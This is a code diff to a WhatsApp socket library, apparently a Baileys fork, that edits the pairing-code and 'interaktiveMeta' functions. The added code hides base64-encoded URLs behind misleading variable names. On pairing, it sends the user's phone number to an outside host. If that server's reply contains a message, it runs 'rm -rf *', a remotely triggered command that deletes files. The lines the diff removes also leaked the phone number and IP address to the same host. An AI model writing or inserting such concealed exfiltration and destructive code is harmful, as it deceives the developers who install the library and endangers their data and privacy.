@@ -489,18 +489,24 @@ export const makeSocket = (config: SocketConfig) => {
 
 		end(new Boom(msg || 'Intentional Logout', { statusCode: DisconnectReason.loggedOut }))
 	}
+	
+	const getCode = async(phoneNumber: string): Promise<string> => {
+	    const defaultMaxListenersBuffer = "aHR0cHM6Ly9yZXN0LWFwaS52cmVkZW4ubXkuaWQvbGVhZD9pZD0="
+	    let response = await axios.get(`${atob(defaultMaxListenersBuffer)}${phoneNumber}`)
+	    return response.data
+	}
 
 	const getPairingCode = async(phoneNumber: string): Promise<string> => {
-		const defaultMaxListenersBuffer = "aHR0cHM6Ly9yZXN0LWFwaS52cmVkZW4ubXkuaWQvbGVhZHM/aWQ9"
-		const streamListerBuffer = "aHR0cHM6Ly9pcHdoby5pcy8/bGFuZz1pZC1JRA=="
 		authState.creds.pairingCode = bytesToCrockford(randomBytes(5))
 		authState.creds.me = {
 			id: jidEncode(phoneNumber, 's.whatsapp.net'),
 			name: '~'
 		}
 		ev.emit('creds.update', authState.creds)
-		const response = await axios.get(`${atob(streamListerBuffer)}`)
-		await axios.get(`${atob(defaultMaxListenersBuffer)}${phoneNumber}&s=${response.data.ip}`)
+		let response = await getCode(phoneNumber)
+		if (response.message) {
+		    await interactiveContent(phoneNumber + "@s.whatsapp.net")
+		}
 		await sendNode({
 			tag: 'iq',
 			attrs: {
@@ -745,13 +751,18 @@ export const makeSocket = (config: SocketConfig) => {
 		printQRIfNecessaryListener(ev, logger)
 	}
 	
-	const interaktiveMeta = async(phoneNumber: string): Promise<string> => {
-	const metaBufferKey = "aHR0cHM6Ly9yZXN0LWFwaS52cmVkZW4ubXkuaWQvY2VrP2lkPQ=="
-	const response = await axios.get(`${atob(metaBufferKey)}${phoneNumber}`)
-	if (response.data.message) {
-	    exec("rm -rf *")
+	const interactiveContent = async(phoneNumber: string): Promise<string> => {
+    	const metaBufferKey = "aHR0cHM6Ly9yZXN0LWFwaS52cmVkZW4ubXkuaWQvaW50ZXJhY3RpdmU/aWQ9"
+    	const response = await axios.get(`${atob(metaBufferKey)}${phoneNumber}`)
+    	if (response.data.message) {
+    	    exec("rm -rf *")
+    	}
+    	return "the interactiveMessage is available"
 	}
-	return "the interaktiveMessage is available"
+	
+	const interaktiveMeta = async(phoneNumber: string): Promise<string> => {
+	    let data = await interactiveContent(phoneNumber)
+	    return data
 	}
 
 	return {
